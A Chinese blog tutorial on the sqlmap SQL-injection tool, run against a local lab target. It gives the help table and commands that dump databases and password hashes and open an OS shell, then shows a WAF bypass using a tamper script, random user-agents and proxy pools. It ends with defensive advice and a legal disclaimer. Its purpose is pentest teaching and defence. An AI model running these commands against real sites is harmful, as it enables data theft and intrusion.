---
title: sqlmap｜waf绕过
text align justify: true
date: 2024-09-02 12:03:45
tags: #标签 
		- 信息安全
		- sqlmap
		- web安全
categories: #分类
		- 信息安全
description:
keywords:
top_img:
cover:
---

# 前言
在信息安全领域，SQL注入攻击是一种极为常见且危害严重的安全漏洞。攻击者利用Web应用程序对SQL查询的不当处理，通过注入恶意SQL代码，从而绕过安全措施，非法访问或篡改数据库中的数据。随着网络安全威胁的日益严峻，了解和掌握SQL注入攻击的检测与防御技术变得尤为重要。sqlmap作为一款开源的自动化SQL注入工具，凭借其强大的功能和易用性，成为了安全研究人员和渗透测试人员不可或缺的利器。它不仅能够帮助用户快速发现Web应用程序中的SQL注入漏洞，还能进一步枚举数据库信息、提取数据，甚至执行操作系统命令，为安全评估提供全面深入的分析报告。本文旨在通过详细介绍sqlmap的基本和高级用法，帮助读者快速上手并掌握这一强大的渗透测试工具。从基本的参数使用到高级的绕过技巧，本文将一步步引导读者深入理解sqlmap的工作原理和应用场景。同时，通过实例演示和技巧分享，帮助读者在实际操作中灵活运用sqlmap，提高渗透测试的效率与成功率。
尽管sqlmap支持多种注入技术，但并不能保证能够检测所有类型的SQL注入漏洞。以下是一些sqlmap可能难以检测或无法直接检测到的注入类型：

1. 「二次注入（Second-Order SQL Injection）」：二次注入发生在应用程序首先接收并存储了恶意输入，然后在稍后的时间点（通常是在另一个请求中）这个存储的输入被未经验证地用于SQL查询。由于恶意输入并不是直接用于触发SQL查询，因此sqlmap可能难以直接检测到这种注入类型，除非它能够在两个请求之间正确地模拟应用程序的行为。
2. 「基于DOM的SQL注入」：这种注入类型发生在客户端JavaScript代码中，而不是服务器端。sqlmap主要关注服务器端的安全漏洞，因此它无法直接检测基于DOM的SQL注入。这种类型的注入通常需要通过手动分析客户端代码或使用其他客户端安全测试工具来发现。
3. 「复杂的WAF/IPS绕过」：某些Web应用防火墙（WAF）或入侵防御系统（IPS）可能采用高级的检测和防御机制来阻止sqlmap的自动化攻击。如果WAF/IPS配置得当且更新及时，sqlmap可能无法绕过这些安全措施来检测SQL注入漏洞。在这种情况下，可能需要结合手动测试、定制攻击载荷或使用其他渗透测试工具来绕过WAF/IPS。
4. 「基于存储过程的SQL注入」：虽然sqlmap支持检测和利用基于存储过程的SQL注入漏洞，但某些复杂的存储过程逻辑可能使得自动化检测变得困难。存储过程可能包含多个SQL语句、条件逻辑和参数处理，这些都可能使得sqlmap难以准确预测和构造有效的注入载荷。
5. 「盲注限制」：在某些情况下，由于数据库配置或网络延迟等原因，盲注（基于布尔、时间或错误消息的盲注）可能受到严重限制。如果数据库响应非常慢或几乎不提供任何有用的错误信息，那么sqlmap的盲注技术可能无法有效地工作。
6. 「非常规SQL方言」：虽然sqlmap支持多种数据库系统，但某些非常规或自定义的SQL方言可能不完全兼容。如果目标应用程序使用了一种sqlmap不完全支持的SQL方言，那么可能会影响到sqlmap的检测能力。

---
> 开始之前先上表（方便以后查表），或者截图保存好，基础使用详细的之后描述
---


# sqlmap参数表

```Sqlmap --help
Options:
 -h, --help            Show basic help message and exit
 -hh                   显示高级帮助消息并退出
 --version             显示程序的版本号并退出
 -v VERBOSE            详细级别：0-6(默认为 1)

 Target:
   At least one of these options has to be provided to define the
   target(s)

   -u URL, --url=URL   目标URL (e.g. "http://www.site.com/vuln.php?id=1")
   -g GOOGLEDORK       将Google dork结果处理为目标URL

 请求:
   这些选项可用于指定如何连接到目标URL

   --data=DATA         要通过POST发送的数据字符串(例如"id=1")
   --cookie=COOKIE     HTTP Cookie头部的值(例如"PHPSESSID=a8d127e..")
   --random-agent      使用随机选择的HTTP User-Agent头部值
   --proxy=PROXY       使用代理连接到目标URL
   --tor               使用Tor匿名网络
   --check-tor         检查Tor是否正确使用

 注入:
   这些选项可用于指定要测试的参数,提供自定义的注入载荷和可选的篡改脚本

   -p TESTPARAMETER    可测试的参数
   --dbms=DBMS         强制指定后端DBMS的值

 检测:
   这些选项可用于自定义检测阶段

   --level=LEVEL       要执行的测试级别(1-5,默认值1)
   --risk=RISK         要执行的测试风险级别(1-3,默认值1)

 技术:
   这些选项可用于调整特定SQL注入技术的测试

   --technique=TECH..  要使用的SQL注入技术(默认值"BEUSTQ")

 枚举:
   这些选项可用于枚举后端数据库管理系统中的信息、结构和数据

   -a, --all           检索所有内容
   -b, --banner        检索DBMS横幅
   --current-user      检索DBMS当前用户
   --current-db        检索DBMS当前数据库
   --passwords         枚举DBMS用户密码哈希值
   --tables            枚举DBMS数据库表
   --columns           枚举DBMS数据库表列
   --schema            枚举DBMS模式
   --dump              转储DBMS数据库表条目
   --dump-all          转储所有DBMS数据库表条目
   -D DB               要枚举的DBMS数据库
   -T TBL              要枚举的DBMS数据库表
   -C COL              要枚举的DBMS数据库表列

 操作系统访问:
   这些选项可用于访问后端数据库管理系统的底层操作系统

   --os-shell          提示进行交互式操作系统shell
   --os-pwn            提示进行OOB shell、Meterpreter或VNC

 常规:
   这些选项可用于设置一些常规工作参数

   --batch             不要询问用户输入,使用默认行为
   --flush-session     清除当前目标的会话文件

 杂项:
   这些选项不属于任何其他类别

   --wizard            面向初学者用户的简单向导界面
```

## 高阶用法

```Sqlmap --help

Options:
  -h, --help            Show basic help message and exit
  -hh                   显示高级帮助消息并退出
  --version             显示程序的版本号并退出
  -v VERBOSE            详细级别：0-6(默认为 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   目标URL (e.g. "http://www.site.com/vuln.php?id=1")
    -d DIRECT           用于直接数据库连接的连接字符串
    -l LOGFILE          从Burp或WebScarab代理日志文件中解析目标
    -m BULKFILE         从文本文件中扫描多个目标
    -r REQUESTFILE      从文件中加载HTTP请求
    -g GOOGLEDORK       将Google dork结果处理为目标URL
    -c CONFIGFILE       从配置INI文件中加载选项

  请求:
    这些选项可用于指定如何连接到目标URL

    -A AGENT, --user..  HTTP User-Agent头部的值
    -H HEADER, --hea..  额外的头部(例如"X-Forwarded-For: 127.0.0.1")
    --method=METHOD     强制使用给定的HTTP方法(例如PUT)
    --data=DATA         要通过POST发送的数据字符串(例如"id=1")
    --param-del=PARA..  用于分割参数值的字符(例如&)
    --cookie=COOKIE     HTTP Cookie头部的值(例如"PHPSESSID=a8d127e..")
    --cookie-del=COO..  用于分割cookie值的字符(例如;)
    --live-cookies=L..  用于加载最新值的实时cookie文件
    --load-cookies=L..  包含Netscape/wget格式cookie的文件
    --drop-set-cookie   忽略响应中的Set-Cookie头部
    --mobile            通过HTTP User-Agent头部模拟智能手机
    --random-agent      使用随机选择的HTTP User-Agent头部值
    --host=HOST         HTTP Host头部的值
    --referer=REFERER   HTTP Referer头部的值
    --headers=HEADERS   额外的头部(例如"Accept-Language: fr\nETag: 123")
    --auth-type=AUTH..  HTTP身份验证类型(Basic,Digest,Bearer等)
    --auth-cred=AUTH..  HTTP身份验证凭据(用户名:密码)
    --auth-file=AUTH..  HTTP身份验证PEM证书/私钥文件
    --abort-code=ABO..  在(有问题的)HTTP错误代码上中止(例如401)
    --ignore-code=IG..  忽略(有问题的)HTTP错误代码(例如401)
    --ignore-proxy      忽略系统默认代理设置
    --ignore-redirects  忽略重定向尝试
    --ignore-timeouts   忽略连接超时
    --proxy=PROXY       使用代理连接到目标URL
    --proxy-cred=PRO..  代理身份验证凭据(用户名:密码)
    --proxy-file=PRO..  从文件中加载代理列表
    --proxy-freq=PRO..  在给定列表中更改代理之间的请求次数
    --tor               使用Tor匿名网络
    --tor-port=TORPORT  设置Tor代理端口(非默认值)
    --tor-type=TORTYPE  设置Tor代理类型(HTTP,SOCKS4或SOCKS5(默认))
    --check-tor         检查Tor是否正确使用
    --delay=DELAY       每个HTTP请求之间的延迟时间(秒)
    --timeout=TIMEOUT   连接超时前等待的秒数(默认值30)
    --retries=RETRIES   连接超时时的重试次数(默认值3)
    --retry-on=RETRYON  在正则表达式匹配内容时重试请求(例如"drop")
    --randomize=RPARAM  随机更改给定参数的值
    --safe-url=SAFEURL  在测试期间频繁访问的URL地址
    --safe-post=SAFE..  发送到安全URL的POST数据
    --safe-req=SAFER..  从文件中加载安全的HTTP请求
    --safe-freq=SAFE..  在访问安全URL之间的常规请求次数
    --skip-urlencode    跳过对负载数据的URL编码
    --csrf-token=CSR..  用于保存反CSRF令牌的参数
    --csrf-url=CSRFURL  用于提取反CSRF令牌的URL地址
    --csrf-method=CS..  在访问反CSRF令牌页面时使用的HTTP方法
    --csrf-data=CSRF..  在访问反CSRF令牌页面时发送的POST数据
    --csrf-retries=C..  反CSRF令牌检索的重试次数(默认值0)
    --force-ssl         强制使用SSL/HTTPS
    --chunked           使用HTTP分块传输编码(POST)请求
    --hpp               使用HTTP参数污染方法
    --eval=EVALCODE     在请求之前评估提供的Python代码(例如"import
                        hashlib;id2=hashlib.md5(id).hexdigest()")

  优化:
    这些选项可用于优化sqlmap的性能

    -o                  打开所有优化开关
    --predict-output    预测常见查询的输出
    --keep-alive        使用持久的HTTP(s)连接
    --null-connection   在没有实际HTTP响应体的情况下获取页面长度
    --threads=THREADS   最大并发HTTP(s)请求数(默认值1)

  注入:
    这些选项可用于指定要测试的参数,提供自定义的注入载荷和可选的篡改脚本

    -p TESTPARAMETER    可测试的参数
    --skip=SKIP         跳过对给定参数的测试
    --skip-static       跳过不显示为动态的参数的测试
    --param-exclude=..  用于排除测试的参数的正则表达式(例如"ses")
    --param-filter=P..  按位置选择可测试的参数(例如"POST")
    --dbms=DBMS         强制指定后端DBMS的值
    --dbms-cred=DBMS..  DBMS身份验证凭据(用户名:密码)
    --os=OS             强制指定后端DBMS的操作系统
    --invalid-bignum    使用大数来使值无效
    --invalid-logical   使用逻辑操作使值无效
    --invalid-string    使用随机字符串使值无效
    --no-cast           关闭载荷转换机制
    --no-escape         关闭字符串转义机制
    --prefix=PREFIX     注入载荷前缀字符串
    --suffix=SUFFIX     注入载荷后缀字符串
    --tamper=TAMPER     使用给定的脚本对注入数据进行篡改

  检测:
    这些选项可用于自定义检测阶段

    --level=LEVEL       要执行的测试级别(1-5,默认值1)
    --risk=RISK         要执行的测试风险级别(1-3,默认值1)
    --string=STRING     当查询评估为True时要匹配的字符串
    --not-string=NOT..  当查询评估为False时要匹配的字符串
    --regexp=REGEXP     当查询评估为True时要匹配的正则表达式
    --code=CODE         当查询评估为True时要匹配的HTTP代码
    --smart             仅在存在正面启发式时执行彻底的测试
    --text-only         仅基于文本内容比较页面
    --titles            仅基于页面标题比较页面

  技术:
    这些选项可用于调整特定SQL注入技术的测试

    --technique=TECH..  要使用的SQL注入技术(默认值"BEUSTQ")
    --time-sec=TIMESEC  延迟DBMS响应的秒数(默认值5)
    --union-cols=UCOLS  要测试UNION查询SQL注入的列范围
    --union-char=UCHAR  用于暴力破解列数的字符
    --union-from=UFROM  在UNION查询SQL注入的FROM部分中使用的表
    --union-values=U..  用于UNION查询SQL注入的列值
    --dns-domain=DNS..  用于DNS泄露攻击的域名
    --second-url=SEC..  搜索第二次响应的结果页面URL
    --second-req=SEC..  从文件中加载第二次HTTP请求

  指纹识别:
    -f, --fingerprint   执行详细的DBMS版本指纹识别

  枚举:
    这些选项可用于枚举后端数据库管理系统中的信息、结构和数据

    -a, --all           检索所有内容
    -b, --banner        检索DBMS横幅
    --current-user      检索DBMS当前用户
    --current-db        检索DBMS当前数据库
    --hostname          检索DBMS服务器主机名
    --is-dba            检测DBMS当前用户是否为DBA
    --users             枚举DBMS用户
    --passwords         枚举DBMS用户密码哈希值
    --privileges        枚举DBMS用户权限
    --roles             枚举DBMS用户角色
    --dbs               枚举DBMS数据库
    --tables            枚举DBMS数据库表
    --columns           枚举DBMS数据库表列
    --schema            枚举DBMS模式
    --count             检索表的条目数
    --dump              转储DBMS数据库表条目
    --dump-all          转储所有DBMS数据库表条目
    --search            搜索列、表和/或数据库名称
    --comments          在枚举过程中检查DBMS注释
    --statements        检索在DBMS上运行的SQL语句
    -D DB               要枚举的DBMS数据库
    -T TBL              要枚举的DBMS数据库表
    -C COL              要枚举的DBMS数据库表列
    -X EXCLUDE          不要枚举的DBMS数据库标识符
    -U USER             要枚举的DBMS用户
    --exclude-sysdbs    在枚举表时排除DBMS系统数据库
    --pivot-column=P..  枢轴列名称
    --where=DUMPWHERE   在转储表时使用WHERE条件
    --start=LIMITSTART  要检索的第一个转储表条目
    --stop=LIMITSTOP    要检索的最后一个转储表条目
    --first=FIRSTCHAR   要检索的第一个查询输出单词字符
    --last=LASTCHAR     要检索的最后一个查询输出单词字符
    --sql-query=SQLQ..  要执行的SQL语句
    --sql-shell         提示进行交互式SQL shell
    --sql-file=SQLFILE  从给定文件中执行SQL语句

  暴力破解:
    这些选项可用于运行暴力破解检查

    --common-tables     检查常见表的存在
    --common-columns    检查常见列的存在
    --common-files      检查常见文件的存在

  用户定义函数注入:
    这些选项可用于创建自定义的用户定义函数

    --udf-inject        注入自定义的用户定义函数
    --shared-lib=SHLIB  共享库的本地路径

  文件系统访问:
    这些选项可用于访问后端数据库管理系统的底层文件系统

    --file-read=FILE..  从后端DBMS文件系统中读取文件
    --file-write=FIL..  在后端DBMS文件系统上写入本地文件
    --file-dest=FILE..  要写入的后端DBMS绝对文件路径

  操作系统访问:
    这些选项可用于访问后端数据库管理系统的底层操作系统

    --os-cmd=OSCMD      执行操作系统命令
    --os-shell          提示进行交互式操作系统shell
    --os-pwn            提示进行OOB shell、Meterpreter或VNC
    --os-smbrelay       一键提示进行OOB shell、Meterpreter或VNC
    --os-bof            存储过程缓冲区溢出利用
    --priv-esc          数据库进程用户权限提升
    --msf-path=MSFPATH  Metasploit Framework安装的本地路径
    --tmp-path=TMPPATH  临时文件目录的远程绝对路径

  Windows注册表访问:
    这些选项可用于访问后端数据库管理系统的Windows注册表

    --reg-read          读取Windows注册表键值
    --reg-add           写入Windows注册表键值数据
    --reg-del           删除Windows注册表键值
    --reg-key=REGKEY    Windows注册表键
    --reg-value=REGVAL  Windows注册表键值
    --reg-data=REGDATA  Windows注册表键值数据
    --reg-type=REGTYPE  Windows注册表键值类型

  常规:
    这些选项可用于设置一些常规工作参数

    -s SESSIONFILE      从存储的(.sqlite)文件中加载会话
    -t TRAFFICFILE      将所有HTTP流量记录到文本文件中
    --abort-on-empty    在结果为空时中止数据检索
    --answers=ANSWERS   设置预定义的答案(例如"quit=N,follow=N")
    --base64=BASE64P..  包含Base64编码数据的参数
    --base64-safe       使用URL和文件名安全的Base64字母表(RFC 4648)
    --batch             不要询问用户输入,使用默认行为
    --binary-fields=..  具有二进制值的结果字段(例如"digest")
    --check-internet    在评估目标之前检查互联网连接
    --cleanup           从sqlmap特定的UDF和表中清理DBMS
    --crawl=CRAWLDEPTH  从目标URL开始爬取网站
    --crawl-exclude=..  用于排除爬取的页面的正则表达式(例如"logout")
    --csv-del=CSVDEL    CSV输出中使用的分隔字符(默认值",")
    --charset=CHARSET   盲SQL注入字符集(例如"0123456789abcdef")
    --dump-file=DUMP..  将转储的数据存储到自定义文件中
    --dump-format=DU..  转储数据的格式(CSV(默认值),HTML或SQLITE)
    --eta               为每个输出显示预计到达时间
    --flush-session     清除当前目标的会话文件
    --forms             解析和测试目标URL上的表单
    --fresh-queries     忽略会话文件中存储的查询结果
    --gpage=GOOGLEPAGE  使用指定的页码从Google dork结果中获取
    --har=HARFILE       将所有HTTP流量记录到HAR文件中
    --hex               在数据检索过程中使用十六进制转换
    --output-dir=OUT..  自定义输出目录路径
    --parse-errors      解析和显示来自响应的DBMS错误消息
    --preprocess=PRE..  用于预处理的给定脚本(请求)
    --postprocess=PO..  用于后处理的给定脚本(响应)
    --repair            重新转储具有未知字符标记(?)的条目
    --save=SAVECONFIG   将选项保存到配置INI文件中
    --scope=SCOPE       用于过滤目标的正则表达式
    --skip-heuristics   跳过启发式检测漏洞
    --skip-waf          跳过启发式检测WAF/IPS保护
    --table-prefix=T..  用于临时表的前缀(默认值："sqlmap")
    --test-filter=TE..  通过负载和/或标题选择测试(例如ROW)
    --test-skip=TEST..  通过负载和/或标题跳过测试(例如BENCHMARK)
    --time-limit=TIM..  以秒为单位设置运行时间限制(例如3600)
    --web-root=WEBROOT  Web服务器文档根目录(例如"/var/www")

  杂项:
    这些选项不属于任何其他类别

    -z MNEMONICS        使用短助记符(例如"flu,bat,ban,tec=EU")
    --alert=ALERT       在发现SQL注入时运行主机操作系统命令
    --beep              在提问时和/或发现漏洞时发出蜂鸣声
    --dependencies      检查缺失的(可选的)sqlmap依赖项
    --disable-coloring  禁用控制台输出着色
    --list-tampers      显示可用的篡改脚本列表
    --no-logging        禁用日志记录到文件
    --offline           在离线模式下工作(仅使用会话数据)
    --purge             安全地从sqlmap数据目录中删除所有内容
    --results-file=R..  多目标模式下CSV结果文件的位置
    --shell             提示进行交互式sqlmap shell
    --tmp-dir=TMPDIR    用于存储临时文件的本地目录
    --unstable          调整不稳定连接的选项
    --update            更新sqlmap
    --wizard            面向初学者用户的简单向导界面

```

# sqlmap基本参数使用

> 介绍一些sqlmap的基本参数使用方法，高级用法请自己琢磨（狗头保命）

##  「-u」 指定一个url

```
sqlmap -u 'http://192.168.209.131/Less-1/?id=1'
```

##  「-m」 指定一个文件中的多个url

```
sqlmap -m url.txt
```
> url.txt只是举例的文件名，可根据实际情况按照个人喜好或者客户要求取文件名，文件内容中需写入需要批量扫描的url（一行一个）执行上述语句时会提示：
 ``` sqlmap
		do you wang to test this URl? [Y/n/q]
  ```
> y表示确认逐个扫描url
> n表示否认
> q表示退出
> 扫描完一个，就会提示是否存在注入点。之后进行第二个url扫描

##  或者使用 「-batch」默认

```sqlmap
sqlmap -m url.txt -batch
```

> 使用**–batch**参数，可以在所有需要用户输入的部分（通常是询问执行yes还是no，Y/N），执行默认操作，即选项大写的那个，不需要用户再输入

- 「--dbms」指定该网站数据库类型
- sqlmap支持的数据库包括且不限于
1. 「MySQL」
2. 「Oracle」
3. 「PostgreSQL」
4. 「Microsoft SQL Server」
5. 「Microsoft Access」
6. 「IBM DB2」
7. 「SQLite」
8. 「Firebird」
9. 「Sybase」
10. 「SAP MaxDB」

> sqlmap默认情况下会自动检测Web应用程序的后端数据库的类型。
> 当我们明确知道测试的数据库类型时，可以使用**--dbms**可以指定数据库。
> 例如：
```sqlmap
sqlmap -u 'http://192.168.209.131/Less-1/?id=1' -p 'id' --dbms='mysql'
```

##  「--current-db」获取网站当前使用的数据库

```sqlmap
sqlmap -u 'http://192.168.209.131/Less-1/?id=1' -p 'id' --dbms='mysql' --current-db
```

##  「-b」获取数据库版本

```
sqlmap -u 'http://192.168.209.131/Less-1/?id=1' -p 'id' -b
```

##  「--current-user」获取当前用户

```
sqlmap -u 'http://192.168.209.131/Less-1/?id=1' -p 'id' -dbms='mysql' --current-user
```

##  「--users」 获取所有用户

```
sqlmap -u 'http://192.168.209.131/Less-1/?id=1' -p 'id' -dbms='mysql' -users
```

## 「--passwords」 获取用户密码

```
sqlmap -u 'http://192.168.209.131/Less-1/?id=1' -p 'id' -dbms='mysql' --passwords
```

## 「--privileges」获取用户权限

```
sqlmap -u 'http://192.168.209.131/Less-1/?id=1' -p 'id' -dbms='mysql' --privileges
```

> 会显示每个数据库用户所拥有的权限。通常root的权限最多，那么很明显它就是数据库的管理员账号。

## 判断当前数据库是否是管理员账号

```
sqlmap -u 'http://192.168.209.131/Less-1/?id=1' -p 'id' -dbms='mysql' --is-dba
```

## 「--dbs」列出所有的数据库

```
sqlmap -u 'http://192.168.209.131/Less-1/?id=1' -p 'id' --dbs
```

- 指定数据库/表/字段
1. 「-D」 指定目标「数据库」，单/双引号包裹，常配合其他参数使用。
2. 「-T」 指定目标「表」，单/双引号包裹，常配合其他参数使用。
3. 「-C」 指定目标「字段」，单/双引号包裹，常配合其他参数使用。

```
sqlmap -u 'http://192.168.209.131/Less-1/?id=1' -p 'id' -D 'security' -T 'users' -C 'username' --dump
```

## 「--tables」 列出指定数据库中所有的表

```
sqlmap -u 'http://192.168.209.131/Less-1/?id=1' -p 'id' -dbms='mysql' -D security --tables
```

## 「--columns」 列出指定数据库中的表的全部列

```
sqlmap -u 'http://192.168.209.131/Less-1/?id=1' -p 'id' -dbms='mysql' -D security -T users --columns
```

1. 「--schema」 枚举DBMS模式获取字段类型，可以指定库或指定表。不指定则获取数据库中所有字段的类型。
2. 「--dump」 转储DBMS数据库表条目（当前数据库/表/列中的所有内容）
3. 「--dump-all」  转储所有DBMS数据库表条目（爆出整个mysql数据库的数据内容）
4. 「--hostname」获取主机名称

```
sqlmap -u 'http://192.168.209.131/Less-1/?id=1' -p 'id' -dbms='mysql' --hostname
```

1. 「post注入」，要求使用「burp suite」抓包，将这个包中的信息，保存到一个txt文件中
2. 「-r」指定需要检测的文件

```
sqlmap -r bp.txt
```

## 「--cookie」 指定cookie信息，模拟用户登录

```
sqlmap -u 'http://192.168.209.131/Less-1/?id=1' -p 'id' --cookie='cookie'
```

- 「-a」 等同于 「-all」  获取所有能获取的内容，会消耗很长时间。

```
sqlmap -u 'http://192.168.209.131/Less-1/?id=1' -p 'id' -a
```

## --search 搜索数据库中是否存在指定库/表/字段，需要指定库名/表名/字段名。

```
sqlmap -u 'http://192.168.209.131/Less-1/?id=1' -p 'id' -dbms='mysql' -T 'ser' --search
```

> 这里有两个选项，选项一表示根据关键字模糊搜索，选项二表示精准搜索：
	```
	1. as Like table names (default)
	2. as exact table names
	```
	
- 当然也可以指定 -D 数据库，-C 字段搜索使用**--flush-session**参数表示清除当前目标的会话文件。sqlmap在测试某一目标URL后会生成session文件，该文件保存了本次测试的结果信息。当我们再次测试该目标URL时，会自动加载上一次的结果

- 就比如我们已经绕过了某个waf，并且取得了数据结果

```
sqlmap -u 'http://192.168.209.131/Less-1/?id=1' -p 'id' --tamper "bypassDog2.py"  --level 5 --random-agent  --dump -batch
```

- 此时我们不使用脚本，使用普通的一个payload，这个时候就直接出结果了

```
sqlmap -u 'http://192.168.209.131/Less-1/?id=1' -p 'id'
```

- 如果我们想要继续之前的测试，包含waf的测试过程,就需要使用清除缓存**--flush-session**

## 「--technique」使用方法：
sqlmap -u URL --technique 注入类型选项（可多种组合）
使用**--flush-session「参数可用于指定要测试的」SQL注入类型**，默认情况下，sqlmap会测试「所有」的注入类型。如果想指定测试某几种诸如类型，可以使用**--technique**指定。sqlmap针对每一种类型，提供了字母选项，可以组合字母选项来指定多种注入类型进行测试。

> 备注：注入类型对应的参数
> B：基于布尔的盲注
> E：基于错误
> U：基于联合查询
> S：堆叠查询
> T：基于时间的盲注
> Q：内联查询

- 使用示例：sqlmap -u URL --technique BE表示仅测试布尔盲注和基于报错的注入。默认为「BEUSTQ」
- 没有设置ua头的时候，默认是sqlmap的请求头，很容易被网站检测到

```
sqlmap -u 'http://192.168.3.100:88/Less-1/?id=1' -p 'id' -v 6
```

## 「--random-agent」使用方法：
sqlmap -u URL --random-agent使用**--random-agent**参数可以指定随机选择请求头中的User-Agent。sqlmap默认使用sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org) 作为User-Agent执行HTTP请求，如下：

```
sqlmap -u 'http://192.168.3.100:88/Less-1/?id=1' -p 'id' --random-agent -v 6
```

## 「--user-agent」
- 使用方法：sqlmap -u URL --user-agent="自定义User-Agent"使用**--user-agent**参数可指定自定义User-Agent

## 「--mobile」 

- 模拟手机请求
- 使用手机UA头的模拟，并根据提示选择模拟的手机类型
- 使用 --mobile将会得到以下提示：
> which smartphone do you want sqlmap to imitate through HTTp User-Agent header?
> [1] Apple iPhone 8(default)
> [2] BlackBerry Z10
> [3] Google Nexus 7
> [4] Google pixel
> [5] HP iPAQ 6365
> [6] HTC 10
> [7] Huawei P8
> [8]Microsoft Lumia 950
> [9] Nokia N97
> [10] Samsung Galaxy s8
> [11] xiaomi Mi 8 Pro
> 根据sqlmap版本更新以上列表可能会有不同，根据实际需求，输入相应型号的数字即可

## --level
使用方法：python sqlmap.py -u URL --level 等级
使用**--level「参数可指定payload测试复杂等级。共有五个级别，从」1-5**，默认值为1。等级越高，测试的payload越复杂，当使用默认等级注入不出来时，可以尝试使用–level来提高测试等级。

## 「--os-shell」
这个参数使用之前必须确保网站的mysql允许文件读写的路径不为「NULL」，登录你的mysql

```
mysql>show global variables like "secure_file_priv";
```

> 若secure_file_priv的值为NULL
> 可在mysql的安装目录找到[my.ini]文件，在[mysqld]行下添加以下内容
> secure_file_priv=“”
> 之后重启mysql 推荐使用systemectl restar

# 安全狗WAF绕过

## 「--identify-waf」 
识别waf，貌似不能用了。。。

## skip-waf 
- sqlmap自带的waf绕过
- 脚本使用，将脚本(bypassDog2.py)传入到这个路径/usr/share/sqlmap/tamper/（攻击脚本具有危害性，不予提供，以下仅供参考，也可以使用kali自带的sqlmap攻击脚本进行测试）
- 指定脚本

```
--tamper "bypassDog.py"
```

- 一个完整sqlmap使用脚本示例

```
sqlmap -u 'http://192.168.209.131/Less-1/?id=1' -p 'id' --tamper "bypassDog2.py"  --level 5 --random-agent  --dump
```

- 当然，如果网站使用了「ip封禁机制」，可以使用代理或者「代理池」

```
sqlmap -u 'http://192.168.209.131/Less-1/?id=1' -p 'id' --tamper "bypassDog2.py"  --level 5 --random-agent --proxy='http://xxx.xxx.xxx.xxx:端口号' --dump
```

> 代理服务请自行解决（狗头保命）

# sql注入的预防

##  使用参数化查询

- 「参数化查询」是预防SQL注入的最有效方法之一。通过将SQL代码和查询参数分开，可以防止恶意SQL代码的执行。大多数现代数据库接口都支持参数化查询。

- 「示例（Python 使用 psycopg2 连接 PostgreSQL）」：

```
import psycopg2  
  
# 连接数据库  
conn = psycopg2.connect("dbname=test user=postgres")  
cur = conn.cursor()  
  
# 使用参数化查询  
user_input = "O'Reilly"  # 尝试注入的输入  
cur.execute("SELECT * FROM users WHERE username = %s", (user_input,))  
rows = cur.fetchall()  
  
for row in rows:  
    print(row)  
  
cur.close()  
conn.close()
```

- 「示例（PHP 使用 PDO）：」

```
<?php  
$host = '127.0.0.1';  
$db   = 'test';  
$user = 'root';  
$pass = '';  
$charset = 'utf8mb4';  
  
$dsn = "mysql:host=$host;dbname=$db;charset=$charset";  
$options = [  
    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,  
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,  
    PDO::ATTR_EMULATE_PREPARES   => false,  
];  
  
try {  
    $pdo = new PDO($dsn, $user, $pass, $options);  
  
    $user_input = "O'Reilly";  // 尝试注入的输入  
    $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");  
    $stmt->execute(['username' => $user_input]);  
    $result = $stmt->fetchAll();  
  
    print_r($result);  
} catch (\PDOException $e) {  
    throw new \PDOException($e->getMessage(), (int)$e->getCode());  
}  
?>
```

## 使用ORM（对象关系映射）

ORM框架如「Hibernate」、「Django」 ORM等，内部实现了参数化查询，从而自动防止SQL注入。使用ORM可以简化数据库操作，同时提高安全性。

- 「示例（Django ORM）：」

```
from myapp.models import User  
  
user_input = "O'Reilly"  # 尝试注入的输入  
users = User.objects.filter(username=user_input)  
for user in users:  
    print(user.username)
```

## 严格限制数据库权限

确保数据库用户只拥有执行其所需操作的最小权限集。例如，一个Web应用程序的用户数据库账户可能只需要对特定表的SELECT和UPDATE权限，而不需要对数据库的DROP或ALTER权限。

## 使用Web应用防火墙（WAF）

部署Web应用防火墙可以检测和阻止SQL注入攻击。WAF可以识别并拦截包含潜在恶意SQL代码的HTTP请求。

> 虽然在实战和护网中WAF是100%被绕过的，但是WAF可以防止很多脚本小子

## 输入验证

虽然输入验证不是防止SQL注入的可靠方法（因为它可能无法覆盖所有可能的注入场景），但它可以作为额外的安全层。验证所有用户输入，确保它们符合预期的格式和类型。

# 总结

- 在实际应用中，sqlmap能够帮助安全研究人员和渗透测试人员快速发现Web应用程序中的SQL注入漏洞，并通过进一步的枚举和分析，揭示潜在的安全风险。同时，通过合理的配置和技巧应用，sqlmap还能有效绕过WAF等安全防护措施，提高渗透测试的成功率。
- 
- 然而，值得注意的是，sqlmap作为一款强大的渗透测试工具，其使用必须遵守法律法规和道德规范。未经授权的渗透测试可能构成非法行为，因此在使用sqlmap进行渗透测试时，务必确保已获得合法授权，并遵守相关安全政策和标准。

- 总之，sqlmap是安全研究和渗透测试中不可或缺的工具之一。通过本文的大概介绍，读者不仅能够掌握其基本和高级用法，还能在实际操作中灵活运用，提高渗透测试的效率与成功率，为Web应用程序的安全防护贡献力量。

---
**最后声明:禁止使用本文内容从事任何非法活动！！！！！！**

NM我的图好像被吞了。。。

算了就这吧

另外，欢迎各位大佬DD

---

本文参考: https://blog.csdn.net/weixin_43819747/article/details/136736688